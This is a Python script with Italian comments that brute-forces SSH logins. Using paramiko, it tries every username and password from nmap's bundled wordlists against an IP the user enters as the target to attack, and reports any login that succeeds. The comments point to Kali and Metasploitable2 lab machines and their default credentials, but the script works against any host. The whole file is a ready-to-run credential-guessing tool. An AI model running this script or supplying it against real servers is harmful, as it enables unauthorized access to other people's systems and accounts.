#! /usr/bin/env python

"""
bruteforce.py - uno script per testare una connessione SSH col bruteforce.
				Utilizziamo username e password comuni testati da nmap.
"""

import paramiko

"""
Questi 2 files contengono un set di usernames e passwords comuni utilizzati 
da nmap per testare la vulnerabilità dei servizi aperti su un server.

################################# NOTA BENE #############################################
#		Testando la kali o la metasploitable2 non otterremo un risultato positivo		#
#		in quanto non sono presenti in queste liste gli username/password usati di 		#
#		default da questi 2 sistemi.													#
#########################################################################################

In alternativa si possono modificare questi files aggiungendo gli username/password
kali/kali e msfadmin/msfadmin usati dai 2 sistemi, oppure si possono specificare 
degli altri file alternativi. 
"""
Users = "/usr/share/nmap/nselib/data/usernames.lst"
Passwords = "/usr/share/nmap/nselib/data/passwords.lst"

# funzione per generare una lista di usernames
def load_users(filename):
	names = []
	with open(filename, "r") as f:
		for user in f:
			# rimuoviamo eventuali whitespaces iniziali e finali
			name = user.strip()
			# non aggiungiamo eventuali commenti presenti nel file
			if not name.startswith('#'):
				names.append(name)
	# restituiamo una lista di nomi puliti
	return names

# funzione per generare una lista di passwords
def load_pass(filename):
	pws = []
	with open(filename, "r") as f:
		for p in f:
			pw = p.strip()
			# anche quì evitiamo i commenti
			if not pw.startswith('#'):
				pws.append(pw)
	return pws

# funzione per tentare la connessione ssh
def ssh_brute_force(ip, username, password):
    try:
        client = paramiko.SSHClient()
        # aggiungiamo il server al nostro known_hosts automaticamente
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        print(f"Mi connetto con username: {username}, password: {password}")
        client.connect(ip, username=username, password=password)
        # se la connessione va a buon fine lo segnaliamo
        print(f"Successo: {username}:{password}")
        # e chiudiamo la connessione restituendo True
        client.close()
        return True
    # eccezione in caso di username e password errati
    except paramiko.AuthenticationException:
    	# la ignoriamo e andiamo avanti
        pass
    # eccezione in caso di errore del programma
    except Exception as e:
    	# la stampiamo a schermo
        print(f"Error: {e}")
    # di default restituiamo falso se non abbiamo trovato username e password
    return False

def main():
	# chiediamo l'input dell'utente
    ip = input("Inserisci l'IP da attaccare: ")

	# estraiamo dai files le liste di username/password
    usernames = load_users(Users)
    passwords = load_pass(Passwords)
    
    # cicli for innestati per testare ogni singola password con ogni singolo nome utente
    # si potrebbe fare in maniera più efficiente con i threads ma non ne sono capace (ancora) :D
    for u in usernames:
        for p in passwords:
            if ssh_brute_force(ip, username=u, password=p):
            	# smettiamo di testare se troviamo la combinazione corretta
                break

# lanciamo il nostro main()
if __name__ == "__main__":
    main()
